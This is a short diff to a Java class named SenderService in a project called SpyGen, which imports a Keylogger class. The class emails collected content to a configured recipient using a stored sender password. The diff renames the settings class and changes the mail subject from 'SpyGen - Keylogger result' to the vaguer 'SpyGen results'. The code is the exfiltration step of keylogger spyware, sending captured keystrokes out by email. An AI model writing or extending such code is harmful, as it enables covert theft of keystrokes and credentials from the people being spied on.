@@ -1,6 +1,6 @@
 package com.houarizegai.spygen.mail;
 
-import com.houarizegai.spygen.global.Constants;
+import com.houarizegai.spygen.global.Settings;
 import com.houarizegai.spygen.global.Utils;
 import com.houarizegai.spygen.keylogger.Keylogger;
 
@@ -14,11 +14,11 @@ public class SenderService implements Runnable {
     }
 
     private void sendMail(String content) {
-        new SendMails().setSenderMail(Constants.senderMail)
-                .setSenderPassword(Constants.senderPassword)
-                .setMessageRecipients(Constants.receiverMail)
+        new SendMails().setSenderMail(Settings.senderMail)
+                .setSenderPassword(Settings.senderPassword)
+                .setMessageRecipients(Settings.receiverMail)
                 .setMessageType("text/html")
-                .setMessageSubject("SpyGen - Keylogger result")
+                .setMessageSubject("SpyGen results")
                 .setMessageContent(content)
                 .send();
     }
